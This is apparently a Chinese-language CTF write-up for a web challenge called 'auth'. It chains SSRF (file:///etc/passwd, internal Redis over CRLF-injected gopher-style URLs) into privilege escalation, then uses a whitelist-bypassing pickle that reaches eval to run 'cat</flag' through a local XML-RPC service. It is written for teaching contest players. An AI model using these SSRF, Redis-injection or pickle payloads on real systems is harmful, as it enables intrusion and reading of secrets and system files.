---
title: 2026全国软件系统安全赛-web wp
date: 2026-03-14 17:45:14
tags: wp/sum
categories: 赛后wp
index_img: /img/4.jpeg
banner_img: /img/4.jpeg
---

auth

开题，先随便注册一个账号

![](/img/Auth/1.png)

发现角色为“普通用户”，故猜测可以进行提权至admin

然后再发现有可能攻击的点：文件上传和ssrf读取

![](/img/Auth/2.png)

由于文件上传的接口被封了，故只能通过提供图片的url进行ssrf
 先试试[file:///etc/passwd](file:///etc/passwd)，抓包发现被隐藏了：

![](/img/Auth/3.png)

故ssrf漏洞成立,试着读取/flag，发现权限不够

![](/img/Auth/4.png)

故可以试着提权,首先抓取登录时的包：

![](/img/Auth/5.png) 

有session，可以试着jwt伪造admin身份

![](/img/Auth/6.png) 

但是密钥呢？

都知道python再用户发出请求运行时能在本地留下dump备份或是垃圾文件，我们就可以通过爆字典的方式爆出来：
 这里用的是SSRFmap的readfile模块爆出来了：

![](/img/Auth/7.png)  

![](/img/Auth/8.png) 

![](/img/Auth/9.png)

拿到加密密钥：1395f3d7c854bb6331e66b8acb40f83aef9bb36eec8ecf332faaafa37b6d6212

但是这里还有点问题，jwt密钥的payload是乱码，无法反复编译

那就只能尝试另一条路：pickle反序列化了

分析源代码，在dump下来的源代码中有这样一段：

```python
 \# Redis配置

CONFIG_FILE_PATH = '/opt/app_config/redis_config.json'

\# 默认配置值

REDIS_HOST = 'localhost'

REDIS_PORT = 6379

REDIS_PASSWORD = '123456'

\# 尝试从配置文件读取配置

try:

  if os.path.exists(CONFIG_FILE_PATH):

​    print(f"从配置文件读取Redis配置: {CONFIG_FILE_PATH}")

​    with open(CONFIG_FILE_PATH, 'r') as config_file:

​      config = json.load(config_file)

​    \# 从配置文件获取配置值，如果不存在则使用默认值

​    REDIS_HOST = config.get('redis_host', REDIS_HOST)

​    REDIS_PORT = config.get('redis_port', REDIS_PORT)

​    REDIS_PASSWORD = config.get('redis_password', REDIS_PASSWORD)

​    

​    print(f"配置文件读取成功: host={REDIS_HOST}, port={REDIS_PORT}")

​    try:

​      os.remove(CONFIG_FILE_PATH)

​      print(f"配置文件已删除: {CONFIG_FILE_PATH}")

​    except Exception as delete_error:

​      print(f"警告：无法删除配置文件 {CONFIG_FILE_PATH}: {delete_error}")

  else:

​    print(f"配置文件不存在: {CONFIG_FILE_PATH}，使用默认Redis配置")

except Exception as config_error:

  print(f"配置文件读取失败: {config_error}，使用默认Redis配置")

\# 连接Redis

try:

  r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PASSWORD, decode_responses=False)

  r.ping()

  print(f"Redis连接成功: {REDIS_HOST}:{REDIS_PORT}")

  \# 从Redis获取或生成随机secret_key

  SECRET_KEY_REDIS_KEY = 'app:secret_key'

  secret_key = r.get(SECRET_KEY_REDIS_KEY)

  if secret_key is None:

​    \# 生成新的随机密钥（64个字符的十六进制字符串）

​    secret_key = secrets.token_hex(32)

​    r.set(SECRET_KEY_REDIS_KEY, secret_key)

​    print(f"已生成新的随机secret_key并保存到Redis: {SECRET_KEY_REDIS_KEY}")

  else:

​    \# Redis返回的是bytes，需要解码为字符串

​    if isinstance(secret_key, bytes):

​      secret_key = secret_key.decode('utf-8')

​    print(f"从Redis加载现有的secret_key: {SECRET_KEY_REDIS_KEY}")


  \# 设置Flask应用的secret_key

  app.secret_key = secret_key

  print(f"Flask secret_key已设置（长度: {len(secret_key)}）")

except Exception as e:

  print(f"Redis连接失败: {e}")

  r = None
```

意味着可以通过内网打ssrf来给自己提权：

![](/img/Auth/10.png)

们重新登陆进去后就有了admin：

![](/img/Auth/11.png)

有了管理员之后就可以看看管理员界面了

![](/img/Auth/12.png)

再次分析源代码：

```python
 @app.route('/admin/online-users')

def admin_online_users():

  if not session.get('logged_in'):

​    return redirect(url_for('login'))

  if session.get('role') != 'admin':

​    return '权限不足，需要管理员权限'

  if r is None:

​    return 'Redis连接失败'

  \# 获取所有在线用户键

  online_keys = r.keys('online_user:*')

  if not online_keys:

​    return '没有在线用户'

  users_html = '<h1>在线用户列表</h1><table border="1" style="border-collapse: collapse; width: 100%;">'

​    users_html += '<tr><th>用户名</th><th>角色</th><th>登录时间</th><th>失效时间</th><th>IP地址</th><th>状态</th></tr>'

  for key in online_keys:

​    try:

​      serialized = r.get(key)

​      if serialized:

​        file = io.BytesIO(serialized)

​        unpickler = RestrictedUnpickler(file)

​        online_user = unpickler.load()

​        expiry_time = datetime.datetime.strptime(online_user.expiry_time, "%Y-%m-%d %H:%M:%S")

​        current_time = datetime.datetime.now()

​        status = '在线' if current_time < expiry_time else '已过期'

​        users_html += f'''

​        <tr>

​          <td>{online_user.username}</td>

​          <td>{online_user.role}</td>

​          <td>{online_user.login_time}</td>

​          <td>{online_user.expiry_time}</td>

​          <td>{online_user.ip_address}</td>

​          <td style="color: {'green' if status == '在线' else 'red'}">{status}</td>

​        </tr>

​        '''

​    except Exception as e:

​      users_html += f'<tr><td colspan="6">反序列化错误: {e}</td></tr>'

  users_html += '</table>'

  \# 获取当前用户信息用于render_page

  current_username = session.get('username', '')

  current_role = session.get('role', '')

  users_html += '''

    <div class="admin-actions mt-30">

​        <a href="/admin/users" class="btn btn-secondary">查看注册用户</a>

​        <a href="/home" class="btn">返回用户中心</a>

  </div>

  '''

  return render_page('在线用户管理', users_html, current_username, current_role)

@app.route('/admin/users')

def admin_users():

  if not session.get('logged_in'):

​    return redirect(url_for('login'))

  if session.get('role') != 'admin':

​    return '权限不足，需要管理员权限'

  if r is None:
​    return 'Redis连接失败'

  \# 获取所有用户键

  user_keys = r.keys('user:*')

  if not user_keys:

​    return '没有注册用户'

  users_html = '<h1>注册用户列表</h1><table border="1" style="border-collapse: collapse; width: 100%;">'

​    users_html += '<tr><th>用户名</th><th>角色</th><th>姓名</th><th>年龄</th><th>手机号码</th><th>创建时间</th></tr>'

  for key in user_keys:

​    try:

​      user_data = r.hgetall(key)

​      if user_data:

​        user_info = {}

​        for field, value in user_data.items():

​          field_str = field.decode('utf-8') if isinstance(field, bytes) else field

​          value_str = value.decode('utf-8') if isinstance(value, bytes) else value

​          user_info[field_str] = value_str

​        username = key.decode('utf-8').replace('user:', '') if isinstance(key, bytes) else key.replace('user:', '')

​        role = user_info.get('role', 'user')

​        name = user_info.get('name', username)

​        age = user_info.get('age', '0')

​        phone = user_info.get('phone', '未填写')

​        created_at = user_info.get('created_at', '未知')

​        users_html += f'''

​        <tr>

​          <td>{username}</td>

​          <td>{role}</td>

​          <td>{name}</td>

​          <td>{age}</td>

​          <td>{phone}</td>

​          <td>{created_at}</td>

​        </tr>

​        '''

​    except Exception as e:

​      users_html += f'<tr><td colspan="6">获取用户信息错误: {e}</td></tr>'

  users_html += '</table>'
  
  current_username = session.get('username', '')

  current_role = session.get('role', '')

  users_html += '''

    <div class="admin-actions mt-30">

​        <a href="/admin/online-users" class="btn btn-secondary">查看在线用户</a>

​        <a href="/home" class="btn">返回用户中心</a>

  </div>

  '''

  return render_page('注册用户管理', users_html, current_username, current_role)
```

我们能知道当我们创建用户时

/admin/online-users会从Redis读取

，然后再执行

```python
unpickler = RestrictedUnpickler(file)

online_user = unpickler.load()
```

虽然做了白名单限制，但允许了：

__main__.OnlineUser/builtins.getattr/builtins.setattr/builtins.dict/builtins.list/builtins.tuple等方法

故可以手工构造protocol 0的pickle，通过getattr一路取到：

OnlineUser.__init__.__globals__.__builtins__.eval

最后执行任意 Python 表达式。

构造思路：
 eval(“python表达式”，OnlineUser.__init__.__globals__)

直接cat /flag会被过滤

所以试试tac /f*通配符绕过

最后给payload得出：

```python
 r.hset(

  'user:123',

  'phone',

  __import__('xmlrpc.client', fromlist=['*'])

   .ServerProxy('http://127.0.0.1:54321')

   .execute_command('mcp_secure_token_b2rglxd', 'cat</flag')['stdout']

)
```

先写入

```html
http://127.0.0.1:6379/?q=1%0D%0AAUTH%20redispass123%0D%0ASET%20online_user:123%20%22...pickle...%22%0D%0AQUIT%0D%0A
```

[](http://127.0.0.1:6379/?q=1 AUTH redispass123 SET online_user:123 "...pickle..." QUIT )

访问/admin/online-users

下边儿拿flag的payload也如法炮制

把这段表达式写进pickle，然后再写入redis：

```python
SET online_user:123 “r.hset(

  'user:123',

  'phone',

  __import__('xmlrpc.client', fromlist=['*'])

   .ServerProxy('http://127.0.0.1:54321')

   .execute_command('mcp_secure_token_b2rglxd', 'cat</flag')['stdout']

)”
```

得出flag

![](/img/Auth/13.png)
